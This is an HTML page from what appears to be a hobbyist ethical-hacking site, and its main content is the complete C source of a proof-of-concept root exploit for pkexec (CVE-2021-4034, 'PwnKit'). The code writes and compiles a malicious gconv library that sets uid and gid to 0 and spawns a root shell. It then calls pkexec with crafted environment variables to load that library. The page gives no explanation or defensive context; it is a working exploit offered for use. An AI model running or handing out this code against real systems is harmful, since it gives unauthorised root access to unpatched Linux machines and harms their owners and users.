<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
	<meta name="description" content="Tenacious is a mostly positive term. If someone calls you tenacious you're probably the kind of person who never gives up and never stops trying; someone who does whatever is required to accomplish a goal. In our efforts to learn the craft of Ethical Hacking, we are T3n4ci0us!" />
        <meta name="author" content="Rob" />
	<title>T3n4ci0us - cve-2021-4034</title>
	<link rel="icon" type="image/png" href="Guy-Fawkes.png" />	
	<link rel="stylesheet" href="css/reset.css">
	<link rel="stylesheet" href="css/cts.css">
	<script src="js/flag.js"></script>
<style>
#bottom{
	width: 100%;
	position: fixed;
	bottom: 7px;
	text-align: center;
}
.cts {
	color: #C0C0C0;
	font-weight: bold;
	font-family: serif;
	font-size: 12pt;
	text-decoration: none;
}
.cts:hover {
	color: #808080;
}
div.codescreen {
  background-color: #151B24;
  font-size: 12pt;
  margin: auto;
  width: 65%;
  text-align: left;
  padding: 10px;
}
@media screen and (max-width: 820px) {
  div.codescreen {
    width: 90%;
  }
}
</style>
</head>
<body>
<div class="hero-image">
  <div class="hero-text">
	<a href="index.html" border="0" title="Your IP Address has been logged."><img src="Kali-Dragon.png" /></a>
  </div>
</div>
<div class="rc_nav" id="centered_nav">
	<a href="https://gchq.github.io/CyberChef/">CyberChef</a>
	<a href="cve-2021-4034.html" title="cve-2021-4034.c">cve-2021-4034.c</a>
	<a href="https://discord.com/channels/659793144711217163/787023376546922496">Discord</a>
	<a href="javascript:void(0);" title="Menu" style="font-size:18px;" class="icon" onclick="navChange()">&#9776;</a>
</div>
<div class="rc_content">
	<div class="codescreen">
/*<br />
 * Proof of Concept: pkexec (CVE-2021-4034)<br />
 * gcc cve-2021-4034.c -o getroot<br />
 */<br />
#include &lt;stdio.h&gt;<br />
#include &lt;stdlib.h&gt;<br />
#include &lt;unistd.h&gt;<br />

char *shell = <br />
&nbsp;&nbsp;&nbsp;&nbsp;	"#include &lt;stdio.h&gt;\n"<br />
&nbsp;&nbsp;&nbsp;&nbsp;	"#include &lt;stdlib.h&gt;\n"<br />
&nbsp;&nbsp;&nbsp;&nbsp;	"#include &lt;unistd.h&gt;\n\n"<br />
&nbsp;&nbsp;&nbsp;&nbsp;	"void gconv() {}\n"<br />
&nbsp;&nbsp;&nbsp;&nbsp;	"void gconv_init() {\n"<br />
&nbsp;&nbsp;&nbsp;&nbsp;	"	setuid(0); setgid(0);\n"<br />
&nbsp;&nbsp;&nbsp;&nbsp;	"	seteuid(0); setegid(0);\n"<br />
&nbsp;&nbsp;&nbsp;&nbsp;	"	system(\"export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin; rm -rf 'GCONV_PATH=.' 'pwnkit'; /bin/sh\");\n"<br />
&nbsp;&nbsp;&nbsp;&nbsp;	"	exit(0);\n"<br />
&nbsp;&nbsp;&nbsp;&nbsp;	"}";<br />
<br />
int main(int argc, char *argv[]) {<br />
&nbsp;&nbsp;&nbsp;&nbsp;	FILE *fp;<br />
&nbsp;&nbsp;&nbsp;&nbsp;	system("mkdir -p 'GCONV_PATH=.'; touch 'GCONV_PATH=./pwnkit'; chmod a+x 'GCONV_PATH=./pwnkit'");<br />
&nbsp;&nbsp;&nbsp;&nbsp;	system("mkdir -p pwnkit; echo 'module UTF-8// PWNKIT// pwnkit 2' &gt; pwnkit/gconv-modules");<br />
&nbsp;&nbsp;&nbsp;&nbsp;	fp = fopen("pwnkit/pwnkit.c", "w");<br />
&nbsp;&nbsp;&nbsp;&nbsp;	fprintf(fp, "%s", shell);<br />
&nbsp;&nbsp;&nbsp;&nbsp;	fclose(fp);<br />
&nbsp;&nbsp;&nbsp;&nbsp;	system("gcc pwnkit/pwnkit.c -o pwnkit/pwnkit.so -shared -fPIC");<br />
&nbsp;&nbsp;&nbsp;&nbsp;	char *env[] = { "pwnkit", "PATH=GCONV_PATH=.", "CHARSET=PWNKIT", "SHELL=pwnkit", NULL };<br />
&nbsp;&nbsp;&nbsp;&nbsp;	execve("/usr/bin/pkexec", (char*[]){NULL}, env);<br />
}<br />
	</div>
</div>

</body>
</html>

